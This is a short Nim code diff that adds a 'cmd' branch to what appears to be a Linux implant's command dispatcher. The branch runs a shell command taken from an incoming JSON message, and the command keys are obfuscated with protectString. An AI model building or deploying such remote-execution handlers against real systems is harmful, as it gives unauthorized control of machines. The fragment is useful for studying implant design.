@@ -133,6 +133,8 @@ proc linux_parse_command*(command: JsonNode): bool =
     var command_type = command[protectString("command_type")].getStr()
 
     case command_type:
+        of protectString("cmd"):
+            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
         of protectString("collect"):
             is_success = collect_data()
         else:
